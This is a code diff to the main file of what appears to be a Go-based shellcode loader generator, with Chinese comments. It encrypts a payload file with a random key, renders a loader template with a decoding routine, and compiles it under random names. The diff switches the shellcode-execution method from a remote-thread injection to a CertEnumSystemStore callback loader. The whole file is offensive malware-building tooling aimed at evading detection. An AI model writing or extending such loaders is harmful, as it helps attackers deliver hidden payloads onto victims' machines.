@@ -5,7 +5,7 @@ import (
 	"strings"
 	"variant/build"
 	"variant/crypto"
-	"variant/enc"
+	"variant/encoder"
 	"variant/log"
 	"variant/rand"
 	"variant/render"
@@ -13,8 +13,8 @@ import (
 
 func main() {
 	// 设置加密参数
-	params := enc.Payload{
-		PlainText: "render/templates/payload.bin",
+	params := encoder.Payload{
+		PlainText: "output/payload.bin",
 		FileName:  rand.RStrings(),
 		Path:      "output",
 		Key:       rand.LByteStrings(16),
@@ -26,28 +26,34 @@ func main() {
 		log.Fatal(err)
 	}
 
+	pk := render.Pokemon{
+		DecryptPokemon: "crypto.PokemonDecode",
+		PokemonPayload: payload,
+		MainPokemon:    rand.RStrings(),
+	}
+
 	loader := render.Loader{
-		Method: "loader.CreateRemoteThreadHalos",
+		Import: "variant/cloader",
+		Method: "cloader.CertEnumSystemStore",
 	}
 
 	// 定义模板渲染数据
 	data := render.Data{
-		CipherText:    rand.RStrings(),
-		PlainText:     rand.RStrings(),
-		Pokemon:       payload,
-		DecryptMethod: "crypto.PokemonDecode",
-		Loader:        loader,
+		CipherText: rand.RStrings(),
+		PlainText:  rand.RStrings(),
+		Pokemon:    pk,
+		Loader:     loader,
 	}
 
 	// 设置模板的渲染参数
 	tOpts := render.TmplOpts{
-		TmplFile:     "render/templates/v4/Base.tmpl",
+		TmplFile:     "render/templates/v5/Base.tmpl",
 		OutputDir:    "output",
 		OutputGoName: fmt.Sprintf("%s.go", rand.RStrings()),
 		Data:         data,
 	}
 	// 生成模板
-	err = render.TmplRender(tOpts)
+	err = tOpts.TmplRender()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -68,5 +74,4 @@ func main() {
 	if err = cOpts.GoCompile(); err != nil {
 		log.Fatal(err)
 	}
-
 }
